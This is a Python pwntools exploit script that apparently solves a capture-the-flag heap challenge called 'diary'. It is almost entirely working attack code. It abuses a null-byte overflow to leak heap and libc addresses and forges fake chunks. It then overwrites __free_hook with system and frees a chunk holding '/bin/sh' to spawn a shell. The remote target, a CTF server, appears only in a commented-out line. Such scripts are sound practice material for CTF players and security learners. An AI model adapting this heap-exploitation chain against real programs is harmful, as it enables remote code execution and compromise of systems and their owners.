from pwn import *
elf = ELF('./diary', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)

p = elf.process()
#p = remote('ctf.joints.id', 17078)
def add_diary(d, m, y, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Day :',   b'%d' % d)
    p.sendlineafter(b'Month :', b'%d' % m)
    p.sendlineafter(b'Year :',  b'%d' % y)
    p.sendafter(b'Data :',  b'%s' % data)
def read_diary(page):
    p.sendlineafter(b'>', b'2')
    for i in range(page):
        if i == (page-1):
            break
        p.sendlineafter(b'>', b'1')
    
    idx = eval(p.recvline_contains('ID').strip().split(b': ')[-1].decode())
    date = p.recvline().strip().split(b': ')[-1].decode()
    data = p.recvline().strip().decode('latin-1')
    
    res = {
        'idx': idx,
        'date': date,
        'data': data
    }
    p.sendlineafter(b'>', b'2')
    return res
def edit_diary(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'ID :', b'%d' % idx)
    p.sendafter(b'Data :', b'%s' % data)

def delete_diary(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'ID :', b'%d' % idx)

# allocate chunk for leak heap address
add_diary(24,24,24,b'AAAA') # 0
edit_diary(0, b'X'*(0xa0))
add_diary(24,24,24,b'BBBB') # 1
# null byte overflow
leak=read_diary(1)
heapaddr = u64(leak['data'].strip('X').ljust(8, '\x00'))
log.info('get heap leak at 0x%x' % heapaddr)

# goes unsorted bin
for i in range(10):
    add_diary(24,24,24,b'AAAA')
for i in range(0,7):
    delete_diary(i)

# null byte overflow => setup fake struct
delete_diary(7) # turn to libc leak
edit_diary(8, b'X'*(0xa8))
payload = b''.join([
    cyclic(2*8*5),
    p64(0x0000001800000002),p64(0x0000001800000018),
])
edit_diary(8, payload) # make fake chunk to point idx 2
payload = b''.join([
    cyclic(2*8*3),
    p64(0),p64(0),
    p64(heapaddr+0x470),p64(0xc1),
    p64(0x0000001800000009),p64(0x0000001800000018),
])
edit_diary(2, payload)
leak=u64(read_diary(2)['data'].ljust(8, '\x00'))
libc.address = leak - (libc.sym['main_arena']+96)
log.info('main arena leak at 0x%x' % leak)
log.info('libc base at 0x%x' % libc.address)

# rce with system
delete_diary(8) # this will overlap chunk 7 and 8
add_diary(24,24,24,b'CCCC') # 12
edit_diary(read_diary(3)['idx'], cyclic(0x90) + p64(libc.sym['__free_hook'] - 0x10)) # overwrite address free_hook sesuai structur pointer
edit_diary(read_diary(2)['idx'], p64(libc.sym['system'])) # free_hook into system
add_diary(24,24,24,b'DDDD') # 13
edit_diary(read_diary(5)['idx'], cyclic(2*8*9) + p64(next(libc.search(b'/bin/sh')))) # overwrite same address as free_hook
delete_diary(read_diary(2)['idx']) # win

p.interactive() 